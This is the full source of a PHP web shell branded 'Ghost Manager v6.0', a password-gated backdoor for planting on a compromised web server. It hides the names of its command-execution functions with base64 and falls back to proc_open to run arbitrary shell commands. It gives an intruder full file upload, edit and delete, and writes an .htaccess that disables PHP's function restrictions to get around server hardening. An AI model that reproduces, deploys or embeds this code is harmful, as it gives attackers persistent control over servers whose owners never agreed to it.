<?php
/**
 * EMERALD MANAGER v6.0 - GHOST BYPASS
 * Hard Bypass: Terminal, Upload Fix, & HTACCESS Injection
 */
session_start();
$password = 'litespeed_ghost'; 
$auth_key = 'emerald_v6_ghost';

// --- ATASI UPLOAD BLANK & LIMITASI ---
@ini_set('memory_limit', '512M');
@ini_set('max_execution_time', 0);
@ini_set('post_max_size', '100M');
@ini_set('upload_max_filesize', '100M');

if (isset($_POST['p']) && $_POST['p'] === $password) { $_SESSION[$auth_key] = true; }
if (!isset($_SESSION[$auth_key])) {
    die('<html><head><style>body{background:#000;color:#0f8;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:monospace;}.b{border:1px solid #0f8;padding:40px;text-align:center;}input{background:#000;border:1px solid #0f8;color:#0f8;padding:10px;width:100%;margin:10px 0;}button{background:#0f8;color:#000;border:none;padding:10px 20px;cursor:pointer;font-weight:bold;}</style></head><body><div class="b"><h2>GHOST ACCESS</h2><form method="POST"><input type="password" name="p" placeholder="KEY"><button type="submit">UNLOCK</button></form></div></body></html>');
}

// --- LOGIKA HARD BYPASS CMD ---
function ghost_cmd($c) {
    $out = "";
    $c = $c . " 2>&1";
    // Array fungsi eksekusi yang disamarkan
    $m = array(base64_decode('c2hlbGxfZXhlYw=='), base64_decode('ZXhlYw=='), base64_decode('cGFzc3RocnU='), base64_decode('c3lzdGVt'));
    foreach ($m as $f) {
        if (function_exists($f)) {
            ob_start();
            if ($f == 'exec') { @$f($c, $r); $out = join("\n", $r); }
            else { @$f($c); $out = ob_get_clean(); }
            if (!empty($out)) return $out;
        }
    }
    // Jika masih gagal, coba lewat Proc_Open
    if (function_exists('proc_open')) {
        $p = @proc_open($c, array(1=>array("pipe","w"), 2=>array("pipe","w")), $pipes);
        if (is_resource($p)) { $out = stream_get_contents($pipes[1]); @proc_close($p); return $out; }
    }
    return "BYPASS FAILED: Server kernel is hardened. Focus on File Manager.";
}

// --- FITUR AUTO-FIX (BYPASS HTACCESS) ---
if (isset($_GET['fix'])) {
    $h = "php_value disable_functions none\nphp_value safe_mode off\nphp_value upload_max_filesize 100M\nphp_value post_max_size 100M";
    @file_put_contents(".htaccess", $h);
    $msg = "HTACCESS Fixed! Refreshing page might unlock CMD/Upload.";
}

$dir = isset($_GET['d']) ? $_GET['d'] : getcwd();
@chdir($dir); $dir = getcwd();
$msg = ''; $cmd_out = '';

// --- HANDLER AKSI ---
if (isset($_POST['cmd'])) { $cmd_out = ghost_cmd($_POST['cmd']); }
if (isset($_FILES['u'])) {
    if ($_FILES['u']['error'] === UPLOAD_ERR_OK) {
        if (@move_uploaded_file($_FILES['u']['tmp_name'], $dir.'/'.$_FILES['u']['name'])) $msg = "Upload OK!";
        else $msg = "Upload error: Move failed. Check permissions.";
    } else { $msg = "Upload error code: " . $_FILES['u']['error']; }
}
if (isset($_POST['act'])) {
    if ($_POST['act'] == 'save') @file_put_contents($_POST['fn'], $_POST['cnt']);
    if ($_POST['act'] == 'mkdir') @mkdir($_POST['fn']);
    if ($_POST['act'] == 'ren') @rename($_POST['old'], $_POST['new']);
}
if (isset($_GET['rm'])) { @unlink($_GET['rm']); @rmdir($_GET['rm']); $msg = "Deleted."; }
?>
<!DOCTYPE html>
<html>
<head>
    <title>Ghost Manager v6.0</title>
    <style>
        :root { --g: #00ff88; --b: #050505; --c: #111; }
        body { background: var(--b); color: #ccc; font-family: 'Consolas', monospace; margin: 0; display: flex; }
        .side { width: 300px; height: 100vh; background: var(--c); border-right: 1px solid #222; padding: 25px; position: fixed; box-sizing: border-box; }
        .main { margin-left: 300px; padding: 30px; width: 100%; box-sizing: border-box; }
        .card { background: #000; border: 1px solid #222; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
        input, textarea { background: #000; border: 1px solid #333; color: var(--g); padding: 10px; width: 100%; margin-bottom: 10px; }
        .btn { background: #008f58; color: #fff; border: none; padding: 12px; width: 100%; cursor: pointer; font-weight: bold; border-radius: 5px; }
        .btn:hover { background: var(--g); color: #000; }
        table { width: 100%; border-collapse: collapse; }
        td { padding: 10px; border-bottom: 1px solid #111; }
        .link { color: var(--g); text-decoration: none; }
        pre { background: #000; color: #0f8; padding: 15px; border: 1px solid var(--g); overflow: auto; }
    </style>
</head>
<body>
    <div class="side">
        <h2 style="color:var(--g)">GHOST v6.0</h2>
        <div class="card">
            <h3>Terminal</h3>
            <form method="POST"><input type="text" name="cmd" placeholder="Command..."><button type="submit" class="btn">EXEC</button></form>
        </div>
        <div class="card">
            <h3>File Management</h3>
            <form method="POST" enctype="multipart/form-data"><input type="file" name="u"><button type="submit" class="btn">UPLOAD</button></form>
            <form method="POST" style="margin-top:10px;"><input type="hidden" name="act" value="mkdir"><input type="text" name="fn" placeholder="New Folder"><button type="submit" class="btn">MKDIR</button></form>
        </div>
        <div class="card">
            <h3>Bypass Tools</h3>
            <a href="?d=<?= urlencode($dir) ?>&fix=1" class="btn" style="display:block; text-align:center; text-decoration:none;">FIX HTACCESS (UNBLOCK)</a>
        </div>
    </div>

    <div class="main">
        <?php if($msg) echo "<div class='card' style='color:var(--g)'>$msg</div>"; ?>
        <div class="card"><strong>DIR:</strong> <span style="color:var(--g)"><?= $dir ?></span></div>
        
        <?php if($cmd_out): ?>
        <div class="card"><h3>Output</h3><pre><?= htmlspecialchars($cmd_out) ?></pre></div>
        <?php endif; ?>

        <div class="card">
            <h3>Explorer</h3>
            <table>
                <?php
                foreach(scandir('.') as $f) {
                    if($f == '.' || $f == '..') continue;
                    echo "<tr><td>" . (is_dir($f) ? "📁 <a href='?d=".urlencode($dir."/".$f)."' class='link'>$f</a>" : "📄 $f") . "</td>";
                    echo "<td><a href='?d=".urlencode($dir)."&e=".urlencode($f)."' class='link'>Edit</a> | <a href='?d=".urlencode($dir)."&rm=".urlencode($f)."' style='color:red'>RM</a></td></tr>";
                }
                ?>
            </table>
        </div>

        <div class="card">
            <h3>Editor / Create File</h3>
            <form method="POST">
                <input type="hidden" name="act" value="save">
                <input type="text" name="fn" placeholder="filename.php" value="<?= isset($_GET['e'])?htmlspecialchars($_GET['e']):'' ?>">
                <textarea name="cnt" rows="15"><?php if(isset($_GET['e']) && !is_dir($_GET['e'])) echo htmlspecialchars(@file_get_contents($_GET['e'])); ?></textarea>
                <button type="submit" class="btn">SAVE FILE</button>
            </form>
        </div>
    </div>
</body>
</html>
